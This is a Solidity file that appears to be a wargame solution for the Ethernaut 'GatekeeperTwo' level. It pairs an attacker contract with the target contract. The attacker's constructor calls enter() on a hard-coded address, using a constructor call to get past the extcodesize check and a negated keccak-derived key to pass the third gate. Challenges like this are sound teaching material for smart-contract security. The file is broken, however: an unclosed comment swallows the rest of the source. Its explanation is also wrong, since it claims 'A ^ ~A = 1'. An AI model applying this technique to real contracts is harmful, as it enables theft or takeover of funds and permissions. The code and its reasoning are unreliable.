// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Caller {
    constructor() public {
        GatekeeperTwo(0xa64172Eb0297E247d25691A308c76F8F7D545AB2).enter(bytes8(uint64(~bytes8(keccak256(abi.encodePacked(address(this)))))));
    }

    /** 
    * gateThree was: require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1);
    * which can be considered as: A^B == uint64(-1)
    * As we know 0 ^ 1 = 1, hence to satisfy A^B = uint64(-1) we negated A: B = (~A)
    * Hence A ^ ~A = 1
    * ~bytes8(keccak256(abi.encodePacked(address(this))))
    // 

}

contract GatekeeperTwo {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller()) }
    require(x == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1);
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

